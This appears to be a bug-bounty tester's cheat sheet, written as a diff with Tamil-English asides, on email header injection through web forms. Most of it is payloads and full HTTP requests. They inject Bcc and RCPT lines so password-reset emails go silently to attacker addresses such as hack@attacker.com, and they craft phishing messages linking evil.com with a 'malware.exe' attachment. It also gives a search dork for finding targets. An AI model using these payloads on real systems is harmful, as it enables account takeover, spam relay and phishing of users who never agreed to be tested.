@@ -1,0 +1,111 @@
+
+WHERE TO TEST:
+	 Signup forms
+	 Contact forms (Use this dork=>inurl:/contact.php OR inurl:/feedback.php "email" site:target.com)
+	 feedback forms 
+	 support forms,all forms
+	 forgot password
+	 otp functions
+	 2fa functions
+	 email verification features
+	 (simplaa email pndra ela features)
+	 
+ TESTING PARAMETERS:
+ (analyze the email, endha parameter directa mail ku vandruko  adhula test pnlaam
+     eg: 
+	1.Does the "email" field get inserted into the "From" or "Reply-To" header?
+	2.Does "name" go into headers?
+	3.Is the form POST-ing to /contact, /feedback, or /support?
+	 
+	 so, *email
+	     *name
+	     *subject idhula la test panlaam
+	     
+	 
+
+PAYLOAD VARIATIONS:
+	%0a
+	%0d%0a
+	\n
+	\r\n
+
+PAYLOADS:
+
+getting backend details:
+	"email":"\">\r\nEHLO a\r\nRCPT TO:<a@a.com>\"@b.com"
+
+forget password:
+	email=attacker@example.com%0ABcc:hack@attacker.com
+	eg:
+	
+	POST /forgot-password HTTP/1.1
+	Host: vulnerable-website.com
+	Content-Type: application/x-www-form-urlencoded
+	Content-Length: 52
+
+	email=attacker@example.com%0ABcc:hack@attacker.com
+
+	
+Email Header Injection:
+	victim@example.com\r\nRCPT TO: attacker@evil.com
+	attacker@example.com%0ABcc:another@evil.com
+
+Multiple Headers injection:
+	attacker@example.com%0ABcc:victim1@example.com%0ABcc:victim2@example.com
+	attacker@example.com%0ABcc:one@evil.com%0ABcc:two@evil.com
+
+	eg:
+	POST /contact.php HTTP/1.1
+	Host: vulnerable-website.com
+	Content-Type: application/x-www-form-urlencoded
+	Content-Length: 138
+
+	name=Alex&email=attacker@example.com%0ABcc:one@evil.com%0ABcc:two@evil.com&subject=Feedback&message=Please+see+attached
+
+	
+Command Injection (for SMTP servers directly):
+	RCPT TO: victim@example.com
+
+Newline Characters:
+	\nBcc:someone@example.com
+	\r\nBcc:someone@example.com
+	%0d%0aBcc:someone@example.com
+	
+maximum impact:
+	"attacker@example.com\nBCC: masslist@spam.com\nSubject: URGENT Security Alert!\nBody: Your account has 
+	been compromised. Click here to secure it: https://evil.com"
+	
+Advanced Exploitation:
+(Sending Malicious Attachments)
+I wanted to see if I could inject attachments into emails to increase the impact.
+
+	From: "support@target.com"\n
+	To: victim@example.com\n
+	Subject: Urgent Action Required\n
+	Content-Type: multipart/mixed; boundary="XYZ"
+
+	--XYZ
+	Content-Type: text/plain
+	Your account is compromised! Click below to verify:
+	https://evil.com
+	--XYZ
+	Content-Type: application/octet-stream; name="malware.exe"
+	Content-Disposition: attachment; filename="malware.exe"
+	[malicious binary content]
+	--XYZ--
+
+This payload would attach a malware file to the email, making it a high-critical vulnerability.	
+CONFIRMATION OR VULN SIGNS:
+	=>Email received at unintended addresses.
+	=>Multiple emails received instead of one.
+	=>Error messages from SMTP server when injecting bad
+	 headers (good indicator).
+	=>Source of the email showing extra headers added by you.
+	
+	
+REAL-WORLD IMPACT:
+	 1.Spam Relay: Your server might be used to send spam emails.
+	 2.Sensitive Info Leak: Password reset emails could be 
+	 silently BCCed to attacker.
+	 3.Phishing: Attackers might spoof headers to trick users.
+	 4.Email Spoofing: Makes it appear as if someone else sent the email.
